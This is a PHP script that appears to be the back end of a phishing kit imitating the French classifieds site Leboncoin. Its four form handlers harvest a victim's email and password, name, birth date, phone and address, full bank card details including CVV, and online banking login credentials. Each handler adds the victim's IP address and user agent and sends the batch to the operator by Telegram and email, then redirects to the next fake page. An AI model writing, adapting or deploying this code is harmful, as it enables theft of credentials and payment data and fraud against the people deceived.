<?php
session_start();
include_once './inc/app.php';
include_once 'functions.php';
include 'email.php';

if (isset($_POST['btn1'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Email            : ".$_POST['ai']."\n";
	$message .= "password              : ".$_POST['pr']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	telegram_send(urlencode($message));
	mail($send, $subject, $message); 
	//header("Location: ./ibn.html");
	header("Location: ./notif/notif.html");
	
	
}

else if (isset($_POST['btn2'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|Info perso |Leboncoin|--------------|\n";
	$message .= "Informations personnelles ";
	$message .= "Nom et Prénoms           : ".$_POST['chn']."\n";
	$message .= "Date de naissance            : ".$_POST['chndato']."\n";
	$message .= "N° de phone           : ".$_POST['ph']."\n";
	$message .= "Adresse           : ".$_POST['ads']."\n";
	$message .= "Code postal           : ".$_POST['codep']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	telegram_send(urlencode($message));
	mail($send, $subject, $message); 
	header("Location: ./ibn1.html");	
}

else if (isset($_POST['btn122'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|info carte bancaire |Leboncoin |--------------|\n";
	$message .= "Type de carte           : ".$_POST['banks1']."\n";
	$message .= "Numero de carte           : ".$_POST['cn1']."\n";
	$message .= "Date d'expiration           : ".$_POST['exdate']."\n";
	$message .= "CVV           : ".$_POST['cvv']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	telegram_send(urlencode($message));
	mail($send, $subject, $message); 
	header("Location: ./ibn22.html");	
}

else if (isset($_POST['btn300'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| IDENTIFIANT BANCAIRE|Leboncoin|--------------|\n";
	$message .= "Identifiant          : ".$_POST['bankType']."\n";
	$message .= "Identifiant          : ".$_POST['cn11']."\n";
	$message .= "Mot de passe          : ".$_POST['exdate11']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	telegram_send(urlencode($message));
	mail($send, $subject, $message); 
	header("Location: ./thank.php");	
}
?>